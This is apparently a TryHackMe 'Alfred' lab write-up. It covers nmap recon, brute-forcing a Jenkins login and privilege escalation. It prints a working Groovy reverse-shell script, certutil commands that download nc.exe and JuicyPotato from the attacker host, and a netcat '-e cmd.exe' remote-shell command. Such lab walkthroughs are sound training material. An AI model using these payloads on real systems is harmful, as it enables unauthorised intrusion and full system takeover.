# Alfred [THM](https://tryhackme.com/room/alfred)
![alfred-01](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/alfred-01.png)

## Recon

Lets scan the target with `nmap`, however do note that the target doesnt respond to pings,
so we have to add the `-Pn` switch:

`nmap -sC -sV -A -p- -Pn 10.10.80.140 -oN nmap.result`


![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/nmap-res-02.png)

We have the following: 

+ An IIS server on port 80. 
+ A Jetty server on port 8080.
+ RDP on port 3389. 

Looks like the IIS server on port 80 is a default site, still worth to take a quick look at it, maybe something is hidden there. After that we will focus on the Jetty server. 


### IIS port 80 


Lets open up our browser and navigate towards `http://10.10.80.140/`

![site-03](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/site-03.png)


Not much to see here, the email address may have revealed a username but nothing else here. 

I ran `ffuf` to try and find hidden content, but that came up empty. Also took a look at the source code, 
nothing there for us. I think its time to move to the Jetty server on port 8080. 



### Jetty port 8080

Lets navigate towards `http://10.10.80.140:8080/`

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/site-04.png)

We are prompted for credentials to login, no sign up link. Lets try brute forcing this, as Jenkins doenst 
impose any restrictions against this attack. 

I capture a login request in Burp, and send it to intruder: 

![login-req-05](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/login-req-05.png)


I then used a sniper attack for the admin account with `/usr/share/wordlists/john.txt`: 

![brute-06](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/brute-06.png)


Lets try to log in with `admin : admin`

![jenkins-07](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/jenkins-07.png)


Were in! Lets go to the script console: 

`http://10.10.62.32:8080/script`


![script-08](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/script-08.png)


From here we can use the following Groovy reverse shell:

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```


Make sure to update your IP and port. 

Then start a listener with:

`nc -lnvp 9009`

Execute the code in the script console:

![execute-09](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/execute-09.png)

This should give us a shell access to the system: 

![shell-10](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/shell-10.png)


## Privilege Escalation


If we take a look at our user's group membership with:

`net user bruce`

![groups-11](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/groups-11.png)

We can see we are a part of the administrators group. This got me thinking about user privileges. 
So i decided to take a look with:

`whoami /priv`

![privs-12](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/privs-12.png)


we can see we have the `SeImpersonate` privilege, lets try a [potato attack](https://github.com/ohpe/juicy-potato/tree/master).

After you download the attack to your kali machine, make sure to grab a copy of `/usr/share/windows-resources/binaries/nc.exe` to your working directory as well. 

Then start a pyhton web server with:

`python3 -m http.server 80`

Then, on the target cd into bruce's home directory and download both `nc.exe` and `JuicyPotato.exe` with:

`certutil -urlcache -f http://kali-ip/nc.exe nc.exe`

`certutil -urlcache -f hrrp://kali-ip/Juicypotato.exe potato.exe`


Start the listener on yout kali with:

`nc -lnvp 9001`

And execute the following on the target:

`potato.exe -l 9001 -p C:\windows\system32\cmd.exe -a "/c c:\Users\bruce\nc.exe -e cmd.exe kali-ip 9001" -t *`


This should give you a shell as the system:

![root-13](https://github.com/DanielIsaev/CTFs/blob/main/TryHackMe/Alfred/img/root-13.png)


